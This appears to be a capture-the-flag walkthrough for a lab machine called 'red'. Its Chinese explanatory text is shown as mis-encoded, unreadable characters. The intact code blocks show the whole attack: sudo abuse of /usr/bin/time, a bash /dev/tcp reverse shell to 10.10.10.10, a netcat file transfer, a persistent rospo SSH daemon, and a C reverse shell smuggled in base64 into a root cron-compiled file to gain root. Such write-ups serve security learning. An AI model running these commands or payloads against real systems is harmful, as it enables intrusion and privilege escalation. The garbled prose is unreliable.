å¯ä»¥çœ‹åˆ°æˆ‘ä»¬æœ‰ä¸€ä¸ªåä¸º ippsec çš„ç”¨æˆ·ï¼Œä¹Ÿå¯ä»¥ä¸ä½¿ç”¨å¯†ç æˆåŠŸç™»å½•ã€‚

```
sudo -l

Matching Defaults entries for john on red:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User john may run the following commands on red:
    (ippsec) NOPASSWD: /usr/bin/time
```



å› æ­¤ï¼Œè¦ä»¥ ippsec èº«ä»½ç™»å½•ï¼Œæˆ‘ä»¬ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤

```
sudo -u ippsec /usr/bin/time /bin/bash
```



ç°åœ¨é¦–å…ˆæˆ‘ä»¬éœ€è¦è¿…é€Ÿé‡‡å–è¡ŒåŠ¨å¹¶ç¦ç”¨ cronjob ç³»ç»Ÿä»¥é¿å…è¢«æ³¨é”€ã€‚

ç°åœ¨æˆ‘ä»¬éœ€è¦åœ¨æ”»å‡»æœºåˆ›å»ºä¸€ä¸ª netcat ç›‘å¬å™¨ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥è·å–è¯¥æœºå™¨çš„ revshellã€‚

```
rlwrap nc -lnvp 3333
```



åœ¨é¶æœºæ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼Œåå¼¹ shellã€‚

```
bash -i >& /dev/tcp/10.10.10.10/3333 0>&1
```



ä¸€æ—¦æˆ‘ä»¬è·å¾—äº†æœºå™¨çš„ revshellï¼Œæˆ‘ä»¬å°±éœ€è¦ä½¿ç”¨è¿™ä¸ª python å‘½ä»¤ã€‚è¿™æ˜¯ä¸€ä¸ªç”¨äºç”Ÿæˆæ–° shell è¿›ç¨‹å¹¶å°†å…¶é™„åŠ åˆ°ç±» Unix ç³»ç»Ÿä¸Šçš„ä¼ªç»ˆç«¯ (pty) çš„å‘½ä»¤ã€‚

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```



ç°åœ¨æˆ‘ä»¬é€šè¿‡ä½¿ç”¨ä»¥ä¸‹æ–¹å¼å°† netcat ä¼šè¯ç½®äºåå°

```
[CTRL + Z]
```



æ¥ä¸‹æ¥æˆ‘ä»¬è¾“å…¥è¿™ä¸ªå‘½ä»¤å¹¶æŒ‰ä¸¤æ¬¡ Enter é”®ï¼Œè¯¥å‘½ä»¤å°†ç»ˆç«¯è®¾ç½®ä¸ºâ€œåŸå§‹â€æ¨¡å¼å¹¶å…³é—­â€œå›æ˜¾â€æ¨¡å¼ã€‚

```
stty raw -echo;fg 
```



è®¾ç½®ç»ˆç«¯ç±»å‹ï¼Œç°åœ¨è¿™ä¸ªè¿‡ç¨‹å·²ç»å®Œæˆï¼Œä¸€æ—¦æˆ‘ä»¬è¢«è¸¢å‡ºï¼Œæˆ‘ä»¬ä»ç„¶å¯ä»¥è®¿é—® shellã€‚

```
export TERM=xterm
```



ä¸ºäº†è·å¾—æ›´å¥½çš„äº¤äº’ä½“éªŒï¼Œè¿™é‡Œæˆ‘æ˜¯ç”¨ rospo å·¥å…·åœ¨ 2222 ç«¯å£å¯åŠ¨ä¸€ä¸ª ssh æœåŠ¡ï¼Œå¹¶ä½¿ç”¨ ssh å®¢æˆ·ç«¯è¿æ¥ä¸Šå»ã€‚

å°† rospo å·¥å…·ä¼ è¾“åˆ°é¶æœºï¼Œæ”»å‡»æœºæ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼š

```
nc -lnvp 4444 < rospo 
Listening on 0.0.0.0 4444
...
```

é¶æœºæ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼š

```
nc 10.10.10.10 4444 > rospo
```



æ£€æŸ¥æ–‡ä»¶æ˜¯å¦ä¼ è¾“æ­£ç¡®ï¼Œå¹¶èµ‹äºˆæ‰§è¡Œæƒé™

```
rospo: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, Go BuildID=wY5thRmEU730-d9-WMID/meQnPmO4P_odf73Yhr5U/307mrOZn7rGvdWn-fpC5/-HjFX7R-q9_Xf9BJZbGq, stripped
```

```
sha512sum rospo
4112a5f2750fa9e4236491b588c22b6321f98d21603ba71b688e193c169eb43bae1192f620b36a764cf1ab193818f6a487eb5f23a34b9c911f5e6f0d3fb2dbde  rospo
```

```
chmod +x rospo
```



å¯åŠ¨æœåŠ¡

```
nohup ./rospo sshd -A 111 -P :2222 > out 2>&1 &
```

```
ssh ippsc@10.10.10.103 -p 2222

 .---------------.
 | ğŸ¸ rospo sshd |
 .---------------.

ippsc@10.10.10.103's password: 
ippsec@red:~$ 
```



ç°åœ¨è®©æˆ‘ä»¬å¯¼èˆªåˆ° wordpress æ–‡ä»¶å¤¹

```
cd /var/www/wordpress
```



ç°åœ¨æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä¸€ä¸ªç”± root å’Œ ippsec æ‹¥æœ‰çš„ .git æ–‡ä»¶å¤¹ã€‚æˆ‘ä»¬éœ€è¦è¿›å…¥è¿™ä¸ªæ–‡ä»¶å¤¹

![image-20250308171924321](./images/vulnhub.assets/image-20250308171924321.png)



åœ¨ .git æ–‡ä»¶å¤¹ä¸­ï¼Œå¯ä»¥çœ‹åˆ°ä¸€ä¸ªåä¸ºsupersecretfileuc.cçš„æ–‡ä»¶ï¼Œç°åœ¨è®©æˆ‘ä»¬ä½¿ç”¨tacæŸ¥çœ‹è¿™ä¸ªæ–‡ä»¶çš„å†…å®¹ï¼š

```
tac supersecretfileuc.c | tac
```

```
#include <stdio.h>
  
int main()
{
  
    // prints hello world
    printf("Get out of here Blue!\n");
  
    return 0;
}
```



ç°åœ¨æˆ‘ä»¬å¯ä»¥çœ‹åˆ° C è„šæœ¬æ˜¯ä¸€ä¸ª cronjobï¼Œå¦‚æœæˆ‘ä»¬å°è¯•æ‰§è¡Œ rev è„šæœ¬ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°å®ƒåŠ è½½äº† cronjob æ¶ˆæ¯ã€‚

![image-20250308172103795](./images/vulnhub.assets/image-20250308172103795.png)



è¿™æ„å‘³ç€ red å¯èƒ½ä¼šä»¥ root ç”¨æˆ·æ‰§è¡Œ rev æ–‡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥å°† rev æ›¿æ¢ä¸ºæˆ‘ä»¬è¿›è¡Œæ„é€ çš„æ–‡ä»¶ï¼ˆä¸€ä¸ªåå‘ shellï¼‰ï¼Œè¿™æ ·å¯ä»¥è·å–åˆ° root æƒé™ã€‚å¦‚æœåˆ é™¤ rev æ–‡ä»¶ï¼Œåœ¨ root æ¯æ¬¡æ‰§è¡Œ rev æ–‡ä»¶å‰ï¼Œä¼šé‡æ–°å°† supersecretfileuc.c æ–‡ä»¶çš„å†…å®¹é‡æ–°ç¼–è¯‘ä¸º revï¼Œæ‰€ä»¥åªéœ€è¦æ›¿æ¢ supersecretfileuc.c æ–‡ä»¶çš„å†…å®¹å³å¯ã€‚ä»¥ä¸‹æ˜¯åå‘ shell çš„ C ä»£ç ã€‚

```
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main(void){
   int port=5555;
   struct sockaddr_in revsockaddr;
   
   int sockt = socket(AF_INET, SOCK_STREAM, 0);
   revsockaddr.sin_family = AF_INET;
   revsockaddr.sin_port = htons(port);
   revsockaddr.sin_addr.s_addr = inet_addr("10.10.10.10");
   
   
  connect(sockt, (struct sockaddr *) &revsockaddr,
  sizeof(revsockaddr));
  dup2(sockt, 0);
  dup2(sockt, 1);
  dup2(sockt, 2);
  
  char * const argv[] = {"/bin/bash", NULL};
  execve("/bin/bash", argv, NULL);
  
  return 0;
  
}
```



ç¼–ç æˆ base64 åç›´æ¥ä½¿ç”¨ echo å‘½ä»¤è¾“å‡ºï¼Œé€šè¿‡ç®¡é“ä¼ è¾“ç»™ base64 å‘½ä»¤è¿›è¡Œè§£ç ï¼Œç„¶åé‡å®šå‘åˆ° supersecretfileuc.c  æ–‡ä»¶ä¸­ã€‚

![image-20250308172512303](./images/vulnhub.assets/image-20250308172512303.png)



ç”±äºè¿™ä¸¤ä¸ªæ–‡ä»¶çš„æ‰€æœ‰æƒä¸º rootï¼Œæ‰€ä»¥ä¸èƒ½ç›´æ¥ä¿®æ”¹ã€‚ç”±äºæˆ‘ä»¬æ‹¥æœ‰çˆ¶ç›®å½•çš„å†™å…¥å…¨æ–°å•Šï¼Œæ‰€ä»¥å¯ä»¥åˆ é™¤æ–‡ä»¶ååœ¨åˆ›å»ºã€‚

```
-rwxr-xr-x 1 root     root     16712 Mar  8 17:24 rev
-rw-r--r-- 1 root     root       123 Oct 31  2021 supersecretfileuc.c
```

```
echo I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPHN5cy90eXBlcy5oPg0KI2luY2x1ZGUgPHN0ZGxpYi5oPg0KI2luY2x1ZGUgPHVuaXN0ZC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCiNpbmNsdWRlIDxhcnBhL2luZXQuaD4NCg0KaW50IG1haW4odm9pZCl7DQogICBpbnQgcG9ydD01NTU1Ow0KICAgc3RydWN0IHNvY2thZGRyX2luIHJldnNvY2thZGRyOw0KICAgDQogICBpbnQgc29ja3QgPSBzb2NrZXQoQUZfSU5FVCwgU09DS19TVFJFQU0sIDApOw0KICAgcmV2c29ja2FkZHIuc2luX2ZhbWlseSA9IEFGX0lORVQ7DQogICByZXZzb2NrYWRkci5zaW5fcG9ydCA9IGh0b25zKHBvcnQpOw0KICAgcmV2c29ja2FkZHIuc2luX2FkZHIuc19hZGRyID0gaW5ldF9hZGRyKCIxMC4xMC4xMC4xMCIpOw0KICAgDQogICANCiAgY29ubmVjdChzb2NrdCwgKHN0cnVjdCBzb2NrYWRkciAqKSAmcmV2c29ja2FkZHIsDQogIHNpemVvZihyZXZzb2NrYWRkcikpOw0KICBkdXAyKHNvY2t0LCAwKTsNCiAgZHVwMihzb2NrdCwgMSk7DQogIGR1cDIoc29ja3QsIDIpOw0KICANCiAgY2hhciAqIGNvbnN0IGFyZ3ZbXSA9IHsiL2Jpbi9iYXNoIiwgTlVMTH07DQogIGV4ZWN2ZSgiL2Jpbi9iYXNoIiwgYXJndiwgTlVMTCk7DQogIA0KICByZXR1cm4gMDsNCiAgDQp9 | base64 -d | tac | tac > supersecretfileuc.c
```



åœ¨æ”»å‡»æœºä¸Šé€šè¿‡ç›‘å¬ 5555 ç«¯å£ï¼Œç­‰å¾…å¤§çº¦ 2 åˆ†é’Ÿåï¼Œæ¥æ”¶åˆ°åå¼¹ shellï¼Œè·å–åˆ° root æƒé™ã€‚

```
nc -lvnp 5555
Listening on 0.0.0.0 5555
Connection received on 10.10.10.103 36318

id
uid=0(root) gid=0(root) groups=0(root)
```

